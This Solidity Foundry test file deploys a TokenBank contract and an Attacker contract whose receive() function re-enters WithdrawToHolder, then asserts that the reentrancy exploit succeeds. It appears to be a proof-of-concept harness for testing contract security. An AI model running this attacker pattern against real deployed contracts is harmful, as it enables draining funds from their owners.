
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < 1 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.Deposit{value: attackVal}();
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Holders(address(this));
        victim.WithdrawToHolder(address(this), val);
        exploitSucceeded = (victim.Holders(address(this)) > initialSnapshot);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.WithdrawToHolder(address(this), attackValue);
        }
    }

    fallback() external payable {}
}
